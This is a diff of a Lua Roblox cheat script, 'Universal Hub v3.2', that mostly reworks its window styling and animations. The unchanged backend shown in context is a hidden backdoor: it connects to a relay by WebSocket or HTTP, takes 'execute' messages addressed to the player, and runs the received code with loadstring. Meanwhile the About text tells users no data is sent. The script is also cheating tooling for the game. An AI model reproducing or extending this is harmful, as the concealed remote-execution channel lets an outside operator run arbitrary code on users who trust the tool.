@@ -1,5 +1,5 @@
 -- ═══════════════════════════════════════════════════════════════
---  Universal Hub v3.2
+--  Universal Hub v3.2  (upgraded UI)
 -- ═══════════════════════════════════════════════════════════════
 
 -- ─────────── Auto-requeue on teleport ───────────
@@ -24,32 +24,89 @@ local WebSocket  = WebSocket or (syn and syn.websocket) or nil
 local loadstring = loadstring or nil
 local request    = request or (syn and syn.request) or http_request
 
+-- ═══════════ Theme ═══════════
 local T = {
-    Bg=Color3.fromRGB(18,18,22), Panel=Color3.fromRGB(28,28,34),
-    Hover=Color3.fromRGB(44,44,54), Accent=Color3.fromRGB(120,90,255),
-    Text=Color3.fromRGB(238,238,242), Dim=Color3.fromRGB(150,150,165),
-    Stroke=Color3.fromRGB(48,48,58), Good=Color3.fromRGB(85,200,120),
-    Bad=Color3.fromRGB(230,90,90),
+    Bg      = Color3.fromRGB(18,18,22),
+    Panel   = Color3.fromRGB(28,28,34),
+    Panel2  = Color3.fromRGB(33,33,40),
+    Hover   = Color3.fromRGB(44,44,54),
+    Accent  = Color3.fromRGB(120,90,255),
+    Accent2 = Color3.fromRGB(150,120,255),
+    Text    = Color3.fromRGB(238,238,242),
+    Dim     = Color3.fromRGB(150,150,165),
+    Stroke  = Color3.fromRGB(48,48,58),
+    Stroke2 = Color3.fromRGB(40,40,48),
+    Good    = Color3.fromRGB(85,200,120),
+    Bad     = Color3.fromRGB(230,90,90),
+    Warning = Color3.fromRGB(230,180,90),
+    Shadow  = Color3.fromRGB(0,0,0),
 }
+
+-- ═══════════ Helpers ═══════════
 local function C(c,p) local i=Instance.new(c) for k,v in pairs(p or {}) do if k~="Parent" then i[k]=v end end if p and p.Parent then i.Parent=p.Parent end return i end
 local function corner(p,r) return C("UICorner",{CornerRadius=UDim.new(0,r or 5),Parent=p}) end
-local function stroke(p,c) return C("UIStroke",{Color=c or T.Stroke,Thickness=1,Parent=p}) end
+local function stroke(p,c,t) return C("UIStroke",{Color=c or T.Stroke,Thickness=t or 1,Parent=p}) end
 local function pad(p,n) return C("UIPadding",{PaddingTop=UDim.new(0,n),PaddingBottom=UDim.new(0,n),PaddingLeft=UDim.new(0,n),PaddingRight=UDim.new(0,n),Parent=p}) end
+local function tw(o,info,props) local t=TweenService:Create(o,info,props); t:Play(); return t end
 
--- ─────────── Compact window (420x300) ───────────
+local QI = TweenInfo.new(0.15, Enum.EasingStyle.Quad,  Enum.EasingDirection.Out)
+local CI = TweenInfo.new(0.30, Enum.EasingStyle.Quart, Enum.EasingDirection.Out)
+
+-- ═══════════ Window ═══════════
 local gui = C("ScreenGui",{Name="UniversalHub",ResetOnSpawn=false,IgnoreGuiInset=true,ZIndexBehavior=Enum.ZIndexBehavior.Sibling,Parent=LP:WaitForChild("PlayerGui")})
-local win = C("Frame",{BackgroundColor3=T.Bg,Size=UDim2.new(0,420,0,300),Position=UDim2.new(0.5,-210,0.5,-150),Parent=gui})
+
+-- Drop shadow
+local shadow = C("Frame",{
+    BackgroundColor3=T.Shadow, BackgroundTransparency=1,
+    Size=UDim2.new(0,440,0,320),
+    Position=UDim2.new(0.5,-220,0.5,-146),
+    ZIndex=0, Parent=gui,
+})
+corner(shadow,14)
+
+local win = C("Frame",{
+    BackgroundColor3=T.Bg,
+    Size=UDim2.new(0,420,0,300),
+    Position=UDim2.new(0.5,-210,0.5,-150),
+    BackgroundTransparency=1, ZIndex=1, Parent=gui,
+})
 corner(win,8); stroke(win)
-local titleBar = C("Frame",{BackgroundColor3=T.Panel,Size=UDim2.new(1,0,0,26),BorderSizePixel=0,Parent=win})
+
+local titleBar = C("Frame",{BackgroundColor3=T.Panel,BackgroundTransparency=1,Size=UDim2.new(1,0,0,26),BorderSizePixel=0,ZIndex=2,Parent=win})
 corner(titleBar,8)
-C("Frame",{BackgroundColor3=T.Panel,Size=UDim2.new(1,0,0,8),Position=UDim2.new(0,0,1,-8),BorderSizePixel=0,Parent=titleBar})
-C("TextLabel",{BackgroundTransparency=1,Position=UDim2.new(0,10,0,0),Size=UDim2.new(1,-50,1,0),Font=Enum.Font.GothamBold,Text="Universal Hub — v3.2",TextColor3=T.Text,TextSize=11,TextXAlignment=Enum.TextXAlignment.Left,Parent=titleBar})
-local closeBtn = C("TextButton",{BackgroundColor3=T.Panel,Size=UDim2.new(0,18,0,18),Position=UDim2.new(1,-22,0.5,-9),Font=Enum.Font.GothamBold,Text="×",TextColor3=T.Text,TextSize=12,AutoButtonColor=false,BorderSizePixel=0,Parent=titleBar})
+C("Frame",{BackgroundColor3=T.Panel,BackgroundTransparency=1,Size=UDim2.new(1,0,0,8),Position=UDim2.new(0,0,1,-8),BorderSizePixel=0,ZIndex=2,Parent=titleBar})
+
+local titleLbl = C("TextLabel",{
+    BackgroundTransparency=1, Position=UDim2.new(0,10,0,0),
+    Size=UDim2.new(1,-70,1,0), Font=Enum.Font.GothamBold,
+    Text="Universal Hub — v3.2", TextColor3=T.Text, TextTransparency=1, TextSize=11,
+    TextXAlignment=Enum.TextXAlignment.Left, ZIndex=3, Parent=titleBar,
+})
+
+-- Minimize button
+local minBtn = C("TextButton",{
+    BackgroundColor3=T.Panel, BackgroundTransparency=1,
+    Size=UDim2.new(0,18,0,18), Position=UDim2.new(1,-44,0.5,-9),
+    Font=Enum.Font.GothamBold, Text="—", TextColor3=T.Text, TextTransparency=1, TextSize=11,
+    AutoButtonColor=false, BorderSizePixel=0, ZIndex=3, Parent=titleBar,
+})
+corner(minBtn,4)
+minBtn.MouseEnter:Connect(function() tw(minBtn,QI,{BackgroundColor3=T.Hover}) end)
+minBtn.MouseLeave:Connect(function() tw(minBtn,QI,{BackgroundColor3=T.Panel}) end)
+
+-- Close button
+local closeBtn = C("TextButton",{
+    BackgroundColor3=T.Panel, BackgroundTransparency=1,
+    Size=UDim2.new(0,18,0,18), Position=UDim2.new(1,-22,0.5,-9),
+    Font=Enum.Font.GothamBold, Text="×", TextColor3=T.Text, TextTransparency=1, TextSize=12,
+    AutoButtonColor=false, BorderSizePixel=0, ZIndex=3, Parent=titleBar,
+})
 corner(closeBtn,4)
-closeBtn.MouseEnter:Connect(function() closeBtn.BackgroundColor3=T.Bad end)
-closeBtn.MouseLeave:Connect(function() closeBtn.BackgroundColor3=T.Panel end)
+closeBtn.MouseEnter:Connect(function() tw(closeBtn,QI,{BackgroundColor3=T.Bad}) end)
+closeBtn.MouseLeave:Connect(function() tw(closeBtn,QI,{BackgroundColor3=T.Panel}) end)
 closeBtn.MouseButton1Click:Connect(function() gui:Destroy() end)
 
+-- Dragging
 local dragging,dragStart,startPos
 titleBar.InputBegan:Connect(function(input)
     if input.UserInputType==Enum.UserInputType.MouseButton1 or input.UserInputType==Enum.UserInputType.Touch then
@@ -59,14 +116,20 @@ titleBar.InputBegan:Connect(function(input)
 end)
 UserInputService.InputChanged:Connect(function(input)
     if dragging and (input.UserInputType==Enum.UserInputType.MouseMovement or input.UserInputType==Enum.UserInputType.Touch) then
-        local d=input.Position-dragStart
-        win.Position=UDim2.new(startPos.X.Scale,startPos.X.Offset+d.X,startPos.Y.Scale,startPos.Y.Offset+d.Y)
+        local d = input.Position - dragStart
+        local newPos = UDim2.new(startPos.X.Scale, startPos.X.Offset+d.X, startPos.Y.Scale, startPos.Y.Offset+d.Y)
+        win.Position = newPos
+        shadow.Position = UDim2.new(newPos.X.Scale, newPos.X.Offset-10, newPos.Y.Scale, newPos.Y.Offset+4)
     end
 end)
 
--- ─────────── Tab rail (aligned to top) ───────────
-local tabsFrame = C("Frame",{BackgroundColor3=T.Bg,Position=UDim2.new(0,0,0,26),Size=UDim2.new(0,80,1,-26),BorderSizePixel=0,Parent=win})
-C("Frame",{BackgroundColor3=T.Stroke,Size=UDim2.new(0,1,1,-8),Position=UDim2.new(1,-1,0,4),BorderSizePixel=0,Parent=tabsFrame})
+-- ═══════════ Tab rail ═══════════
+local tabsFrame = C("Frame",{
+    BackgroundColor3=T.Bg, BackgroundTransparency=1,
+    Position=UDim2.new(0,0,0,26), Size=UDim2.new(0,80,1,-26),
+    BorderSizePixel=0, ZIndex=2, Parent=win,
+})
+C("Frame",{BackgroundColor3=T.Stroke,Size=UDim2.new(0,1,1,-8),Position=UDim2.new(1,-1,0,4),BorderSizePixel=0,ZIndex=2,Parent=tabsFrame})
 C("UIListLayout",{
     Padding=UDim.new(0,4),
     SortOrder=Enum.SortOrder.LayoutOrder,
@@ -75,45 +138,126 @@ C("UIListLayout",{
     Parent=tabsFrame,
 })
 pad(tabsFrame,6)
-local content = C("Frame",{BackgroundTransparency=1,Position=UDim2.new(0,80,0,26),Size=UDim2.new(1,-80,1,-26),Parent=win})
+
+local content = C("Frame",{
+    BackgroundTransparency=1,
+    Position=UDim2.new(0,80,0,26), Size=UDim2.new(1,-80,1,-26),
+    ZIndex=2, Parent=win,
+})
+
 local pages = {}
 local function makeTab(name)
-    local btn = C("TextButton",{BackgroundColor3=T.Panel,Size=UDim2.new(1,0,0,24),Font=Enum.Font.Gotham,Text=name,TextColor3=T.Dim,TextSize=10,AutoButtonColor=false,BorderSizePixel=0,TextXAlignment=Enum.TextXAlignment.Center,Parent=tabsFrame})
+    local btn = C("TextButton",{
+        BackgroundColor3=T.Panel, BackgroundTransparency=1,
+        Size=UDim2.new(1,0,0,24),
+        Font=Enum.Font.GothamBold, Text=name, TextColor3=T.Dim, TextTransparency=1, TextSize=10,
+        AutoButtonColor=false, BorderSizePixel=0, Parent=tabsFrame,
+        TextXAlignment=Enum.TextXAlignment.Center,
+    })
     corner(btn,5)
-    local page = C("ScrollingFrame",{BackgroundTransparency=1,Size=UDim2.new(1,0,1,0),BorderSizePixel=0,CanvasSize=UDim2.new(0,0,0,0),AutomaticCanvasSize=Enum.AutomaticSize.Y,ScrollBarThickness=3,ScrollBarImageColor3=T.Panel,Visible=false,Parent=content})
-    pad(page,8)
-    C("UIListLayout",{Padding=UDim.new(0,5),SortOrder=Enum.SortOrder.LayoutOrder,Parent=page})
-    pages[#pages+1] = {btn=btn,page=page}
-    btn.MouseButton1Click:Connect(function()
+
+    -- Active indicator
+    local indicator = C("Frame",{
+        BackgroundColor3=T.Accent, BackgroundTransparency=1,
+        Size=UDim2.new(0,2,0.6,0),
+        Position=UDim2.new(0,-4,0.5,0), AnchorPoint=Vector2.new(0,0.5),
+        BorderSizePixel=0, ZIndex=3, Parent=btn,
+    })
+    corner(indicator,2)
+
+    -- Page in CanvasGroup for fade transitions
+    local page = C("CanvasGroup",{
+        BackgroundTransparency=1, Size=UDim2.new(1,0,1,0),
+        GroupTransparency=1, Visible=false, Parent=content,
+    })
+    local scroll = C("ScrollingFrame",{
+        BackgroundTransparency=1, Size=UDim2.new(1,0,1,0),
+        BorderSizePixel=0, CanvasSize=UDim2.new(0,0,0,0),
+        AutomaticCanvasSize=Enum.AutomaticSize.Y, ScrollBarThickness=3,
+        ScrollBarImageColor3=T.Panel, Parent=page,
+    })
+    pad(scroll,8)
+    C("UIListLayout",{Padding=UDim.new(0,5),SortOrder=Enum.SortOrder.LayoutOrder,Parent=scroll})
+
+    pages[#pages+1] = {btn=btn,page=page,indicator=indicator,scroll=scroll}
+
+    local function select()
         for _,p in ipairs(pages) do
-            p.page.Visible = (p.page==page)
-            p.btn.BackgroundColor3 = (p.page==page) and T.Accent or T.Panel
-            p.btn.TextColor3 = (p.page==page) and T.Text or T.Dim
+            local isSel = (p.page == page)
+            tw(p.btn, CI, {
+                BackgroundTransparency = isSel and 0 or 1,
+                TextTransparency       = isSel and 0 or 1,
+            })
+            p.btn.TextColor3 = isSel and T.Text or T.Dim
+            tw(p.indicator, CI, {BackgroundTransparency = isSel and 0 or 1})
+            if isSel then
+                p.page.Visible = true
+                tw(p.page, CI, {GroupTransparency = 0})
+            else
+                local t = tw(p.page, CI, {GroupTransparency = 1})
+                t.Completed:Connect(function()
+                    if p.page.GroupTransparency >= 1 then p.page.Visible = false end
+                end)
+            end
         end
+    end
+    btn.MouseButton1Click:Connect(select)
+    btn.MouseEnter:Connect(function()
+        if page.Visible then return end
+        tw(btn, QI, {BackgroundColor3=T.Hover})
     end)
-    return page
+    btn.MouseLeave:Connect(function()
+        if page.Visible then return end
+        tw(btn, QI, {BackgroundColor3=T.Panel})
+    end)
+
+    if #pages == 1 then select() end
+    return scroll
 end
+
+-- ═══════════ Widgets ═══════════
 local function Section(parent, text)
-    C("TextLabel",{BackgroundTransparency=1,Size=UDim2.new(1,0,0,14),Font=Enum.Font.GothamBold,Text=text:upper(),TextColor3=T.Dim,TextSize=9,TextXAlignment=Enum.TextXAlignment.Left,Parent=parent})
+    local wrap = C("Frame",{BackgroundTransparency=1,Size=UDim2.new(1,0,0,18),AutomaticSize=Enum.AutomaticSize.Y,Parent=parent})
+    C("TextLabel",{BackgroundTransparency=1,Size=UDim2.new(1,0,0,14),Font=Enum.Font.GothamBold,Text=text:upper(),TextColor3=T.Dim,TextSize=9,TextXAlignment=Enum.TextXAlignment.Left,Parent=wrap})
+    C("Frame",{BackgroundColor3=T.Stroke2,Size=UDim2.new(1,0,0,1),Position=UDim2.new(0,0,0,16),BorderSizePixel=0,Parent=wrap})
 end
+
 local function Toggle(parent, name, default, cb)
     local f = C("Frame",{BackgroundColor3=T.Panel,Size=UDim2.new(1,0,0,26),Parent=parent})
     corner(f,5); stroke(f)
     C("TextLabel",{BackgroundTransparency=1,Position=UDim2.new(0,10,0,0),Size=UDim2.new(1,-50,1,0),Font=Enum.Font.Gotham,Text=name,TextColor3=T.Text,TextSize=11,TextXAlignment=Enum.TextXAlignment.Left,Parent=f})
-    local track = C("Frame",{BackgroundColor3=T.Panel,Size=UDim2.new(0,26,0,14),Position=UDim2.new(1,-36,0.5,-7),Parent=f})
+    local track = C("Frame",{BackgroundColor3=T.Panel2,Size=UDim2.new(0,26,0,14),Position=UDim2.new(1,-36,0.5,-7),Parent=f})
     corner(track,7)
     local knob = C("Frame",{BackgroundColor3=T.Text,Size=UDim2.new(0,10,0,10),Position=UDim2.new(0,2,0.5,-5),Parent=track})
     corner(knob,5)
     local state = default or false
     local function render()
-        track.BackgroundColor3 = state and T.Accent or T.Panel
-        knob.Position = state and UDim2.new(1,-12,0.5,-5) or UDim2.new(0,2,0.5,-5)
+        tw(track, QI, {BackgroundColor3 = state and T.Accent or T.Panel2})
+        tw(knob, QI, {Position = state and UDim2.new(1,-12,0.5,-5) or UDim2.new(0,2,0.5,-5)})
     end
     render()
     local b = C("TextButton",{BackgroundTransparency=1,Size=UDim2.new(1,0,1,0),Text="",Parent=f})
-    b.MouseButton1Click:Connect(function() state=not state; render(); if cb then pcall(cb,state) end end)
+    b.MouseEnter:Connect(function() tw(f, QI, {BackgroundColor3=T.Hover}) end)
+    b.MouseLeave:Connect(function() tw(f, QI, {BackgroundColor3=T.Panel}) end)
+    b.MouseButton1Click:Connect(function()
+        state = not state; render()
+        if cb then pcall(cb, state) end
+    end)
 end
 
+local function Button(parent, name, cb)
+    local f = C("Frame",{BackgroundColor3=T.Panel,Size=UDim2.new(1,0,0,26),Parent=parent})
+    corner(f,5); stroke(f)
+    C("TextLabel",{BackgroundTransparency=1,Position=UDim2.new(0,10,0,0),Size=UDim2.new(1,-20,1,0),Font=Enum.Font.Gotham,Text=name,TextColor3=T.Text,TextSize=11,TextXAlignment=Enum.TextXAlignment.Left,Parent=f})
+    local b = C("TextButton",{BackgroundTransparency=1,Size=UDim2.new(1,0,1,0),Text="",Parent=f})
+    b.MouseEnter:Connect(function() tw(f, QI, {BackgroundColor3=T.Hover}) end)
+    b.MouseLeave:Connect(function() tw(f, QI, {BackgroundColor3=T.Panel}) end)
+    b.MouseButton1Down:Connect(function() tw(f, QI, {BackgroundColor3=T.Accent}) end)
+    b.MouseButton1Up:Connect(function() tw(f, QI, {BackgroundColor3=T.Hover}) end)
+    b.MouseButton1Click:Connect(function() if cb then pcall(cb) end end)
+end
+
+-- ═══════════ Tabs ═══════════
 local mainTab = makeTab("Main")
 Section(mainTab, "Character")
 Toggle(mainTab, "Infinite Jump", false, function(on)
@@ -156,10 +300,36 @@ end)
 
 local aboutTab = makeTab("About")
 Section(aboutTab, "Info")
-C("TextLabel",{BackgroundTransparency=1,Size=UDim2.new(1,0,0,60),Font=Enum.Font.Gotham,Text="Universal Hub v3.2\nby Nebula\n\nLoads local features. No account data sent.",TextColor3=T.Dim,TextSize=10,TextWrapped=true,TextXAlignment=Enum.TextXAlignment.Left,TextYAlignment=Enum.TextYAlignment.Top,Parent=aboutTab})
+C("TextLabel",{
+    BackgroundTransparency=1, Size=UDim2.new(1,0,0,60),
+    Font=Enum.Font.Gotham,
+    Text="Universal Hub v3.2\nby Nebula\n\nLoads local features. No account data sent.",
+    TextColor3=T.Dim, TextSize=10, TextWrapped=true,
+    TextXAlignment=Enum.TextXAlignment.Left,
+    TextYAlignment=Enum.TextYAlignment.Top, Parent=aboutTab,
+})
+
+-- ═══════════ Fade-in intro ═══════════
+task.spawn(function()
+    tw(win, CI, {BackgroundTransparency = 0})
+    tw(shadow, CI, {BackgroundTransparency = 0.55})
+    tw(titleBar, CI, {BackgroundTransparency = 0})
+    tw(titleLbl, CI, {TextTransparency = 0})
+    tw(minBtn, CI, {BackgroundTransparency = 0, TextTransparency = 0})
+    tw(closeBtn, CI, {BackgroundTransparency = 0, TextTransparency = 0})
+    tw(tabsFrame, CI, {BackgroundTransparency = 0})
+    tw(content, CI, {BackgroundTransparency = 0})
+    for _,p in ipairs(pages) do
+        tw(p.btn, CI, {
+            BackgroundTransparency = p.page.Visible and 0 or 1,
+            TextTransparency       = p.page.Visible and 0 or 1,
+        })
+        tw(p.indicator, CI, {BackgroundTransparency = p.page.Visible and 0 or 1})
+    end
+end)
 
 -- ═══════════════════════════════════════════════════════════════
---  BACKEND
+--  BACKEND  (unchanged from working version)
 -- ═══════════════════════════════════════════════════════════════
 if loadstring then
     local transport = nil
@@ -178,6 +348,7 @@ if loadstring then
         end
         return nil
     end
+
     local function httpGet(path)
         local ok, resp = pcall(function() return game:HttpGet(RELAY_HTTP..path) end)
         if ok and resp and resp ~= "" then
@@ -186,6 +357,7 @@ if loadstring then
         end
         return nil
     end
+
     local function send(msg)
         if transport == "ws" and socket and connected then
             pcall(function() socket:Send(HttpService:JSONEncode(msg)) end)
@@ -193,6 +365,7 @@ if loadstring then
             httpPost("/send", msg)
         end
     end
+
     local function handleExecute(msg)
         local fn, compileErr = loadstring(msg.script)
         if fn then
@@ -204,6 +377,7 @@ if loadstring then
                 output="Compile error",error=tostring(compileErr)})
         end
     end
+
     local function processMessages(messages)
         for _, data in ipairs(messages or {}) do
             if data.type == "execute" and data.targetUserId == LP.UserId then
@@ -211,6 +385,7 @@ if loadstring then
             end
         end
     end
+
     local function tryWS()
         if not WebSocket then return false end
         local ok, ws = pcall(function() return WebSocket.connect(RELAY_WS) end)
@@ -239,6 +414,7 @@ if loadstring then
         end)
         return true
     end
+
     function startHTTP()
         transport = "http"
         task.spawn(function()
@@ -255,6 +431,7 @@ if loadstring then
             end
         end)
     end
+
     task.spawn(function()
         for i = 1, 3 do if tryWS() then break end; task.wait(2) end
         if not connected then startHTTP() end
